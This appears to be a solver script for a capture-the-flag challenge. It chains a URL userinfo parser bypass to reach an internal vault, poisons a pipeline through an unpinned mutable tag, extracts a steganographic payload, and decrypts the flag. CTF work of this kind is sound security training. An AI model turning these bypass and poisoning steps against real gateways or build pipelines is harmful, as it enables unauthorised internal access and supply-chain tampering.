#!/usr/bin/env python3
import argparse
import hashlib
import json
import sys
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from abyss_ctf.engine import b64u_decode, chacha_decrypt, kdf, lsb_extract_rgb  # noqa: E402


def recover_pepper(token: str, vault_cipher: str) -> str:
    data = b64u_decode(vault_cipher)
    mask = hashlib.blake2b(("vault|" + token).encode(), digest_size=32).digest()
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ mask[i % len(mask)])
    return bytes(out).decode()


def solve(base_url: str, team: str):
    base = base_url.rstrip("/")
    reg = requests.post(f"{base}/api/register", json={"team_name": team}, timeout=10)
    reg.raise_for_status()
    rj = reg.json()
    if not rj.get("ok"):
        raise RuntimeError(f"register failed: {rj}")
    token = rj["session"]["token"]
    headers = {"X-Team-Token": token}

    # Stage A: parser differential bypass
    bypass = "https://registry.ctf-trusted.local@artifact-vault.ctf.local/bootstrap"
    fr = requests.post(f"{base}/api/gateway/fetch", headers=headers, json={"url": bypass}, timeout=10)
    fr.raise_for_status()
    fj = fr.json()
    if not fj.get("ok") or fj["source"] != "internal_vault":
        raise RuntimeError(f"stage A failed: {fj}")
    seed = fj["clue"]["seed"]

    # Stage B: mutable tag poisoning (v5 alias)
    pr = requests.post(
        f"{base}/api/pipeline/run",
        headers=headers,
        json={"mutable_tag": "v5", "pin_sha": ""},
        timeout=10,
    )
    pr.raise_for_status()
    pj = pr.json()
    if not pj.get("ok") or not pj.get("poisoned"):
        raise RuntimeError(f"stage B failed: {pj}")
    tag_digest = pj["tag_digest"]

    # Stage C: extract stego payload from carrier PNG
    carrier = requests.get(f"{base}/api/artifact/carrier", headers=headers, params={"tag_digest": tag_digest}, timeout=20)
    carrier.raise_for_status()
    blob = lsb_extract_rgb(carrier.content)
    enc = json.loads(blob.decode())

    # Stage D: recover pepper -> derive key -> decrypt
    kh = requests.get(f"{base}/api/metadata", headers=headers, timeout=10)
    kh.raise_for_status()
    kj = kh.json()
    if not kj.get("ok"):
        raise RuntimeError(f"key hint failed: {kj}")
    pepper = recover_pepper(token, kj["vault_cipher"])
    key = kdf(token, pepper, tag_digest)
    aad = f"{token}|{tag_digest}|abyss-2026".encode()
    plain = chacha_decrypt(enc, key, aad)
    final_flag = json.loads(plain.decode())["flag"]

    sub = requests.post(f"{base}/api/submit", headers=headers, json={"flag": final_flag}, timeout=10)
    sub.raise_for_status()
    sj = sub.json()
    if not sj.get("ok") or not sj.get("solved"):
        raise RuntimeError(f"submit failed: {sj}")

    print(f"[+] team={team}")
    print(f"[+] token={token}")
    print(f"[+] seed={seed}")
    print(f"[+] tag_digest={tag_digest}")
    print(f"[+] final_flag={final_flag}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--team", required=True)
    args = ap.parse_args()
    solve(args.base_url, args.team)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[!] solve A failed: {exc}")
        sys.exit(1)
